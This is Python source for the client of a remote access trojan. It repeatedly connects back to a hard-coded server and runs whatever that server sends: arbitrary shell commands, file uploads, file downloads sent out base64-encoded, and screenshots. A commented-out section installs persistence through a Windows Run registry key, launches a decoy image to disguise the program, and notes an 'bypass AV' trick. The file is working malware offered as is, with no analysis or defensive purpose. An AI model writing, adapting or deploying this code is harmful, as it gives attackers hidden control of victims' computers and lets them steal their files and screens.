import socket 
import os
import sys
import shutil
import subprocess
import time
import base64
from mss import mss

SERVER_IP = "169.254.246.191"
PORT = 5050
ADDR = (SERVER_IP, PORT)
#client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
BUFFER = 1024 * 128

def is_admin():
    try:
        temp = os.listdir(os.sep.join([os.environ.get('Systemroot', 'C:\windows'), 'temp']))
    except:
        admin = "[!!] User Privileges [!!]"
    else:
        admin = "[+] Admin Privileges [+]"

    return admin

def shell(command):
    try:
        CMD = subprocess.run(command, stdout=subprocess.PIPE, stderr= subprocess.PIPE, shell = True)
        CMD_OUT = CMD.stdout.decode('utf-8', errors='replace') + CMD.stderr.decode('utf-8', errors='replace')

        if CMD_OUT == '':
            CMD_OUT = '[DONE/ERROR]'

    except:
        CMD_OUT = '[ERROR]'

    client.send(CMD_OUT.encode())

def start(command_s):
    CMD = subprocess.run(command_s[1], shell = True)
    
def cd(command_s):
    try:
        os.chdir(command_s[1])
        client.send('[DONE]'.encode())
    except:
        client.send('[ERROR]'.encode())

def pwd():
    try:
        client.send(os.getcwd().encode())
    except:
        client.send('[ERROR]'.encode())

def upload(command_s):
    try:
        with open(command_s[1], "wb") as fin:                              
            file_data = client.recv(BUFFER)
            if file_data != '[ERROR]' and file_data != '':
                fin.write(base64.b64decode(file_data))
                client.send("[DONE]".encode())
            else:
                client.send('[ERROR]'.encode())
    except:
        client.send('[ERROR]'.encode())

def download(command_s): 
    try:
        with open(command_s[1], "rb") as file: 
            client.send(base64.b64encode(file.read()))
        if command_s[1] == 'screen.png':
            try:
                os.remove(command_s[1])
            except:
                pass
    except:
        client.send('[ERROR]'.encode())

def screenshot():
    with mss() as screenshot:
        screenshot.shot(output = 'screen.png')

def connection():
    while True:
        try:
            time.sleep(5)
            global client
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(ADDR)
            commands()
            client.close()
        except: 
            continue

def commands():
    while True:
        try:
            command = client.recv(BUFFER).decode()
            command_s = command.split()

            if command == 'q':
                break

            if command_s[0] == 'check':
                adm = is_admin()
                client.send(adm.encode())
                
            elif command_s[0] == 'cd' and len(command_s)>1:
                cd(command_s)
                
            elif command == 'pwd':
                pwd()

            elif command_s[0] == 'upload' and len(command_s)>1:
                upload(command_s)

            elif command_s[0] == 'download' and len(command_s)>1:
                download(command_s)

            elif command == 'screenshot':
                try:
                    screenshot()
                    client.send('[DONE]'.encode())
                except:
                    client.send('[ERROR]'.encode())

            elif command == '[ERROR]':
                client.send('[ERROR]'.encode())

            elif command == '[DONE]':
                client.send('[DONE]'.encode())

            elif command_s[0] == 'start' and len(command_s)>1:
                try:
                    start(command_s)
                    client.send('[DONE]'.encode())
                except:
                    client.send('[ERROR]'.encode())
            else:
                shell(command)
            
        except:
            break

'''
location = os.environ["appdata"] + "\\win32.exe" 
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location)
    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v StartUp /t REG_SZ /d "' + location + '"', shell=True)

    file_name = sys._MEIPASS + "\image.jpg"
    try:
        subprocess.Popen(file_name, shell=True)
    except:
        number = 1
        number2 = 2  #bypass AV
        number3 = number + number2
'''
connection()
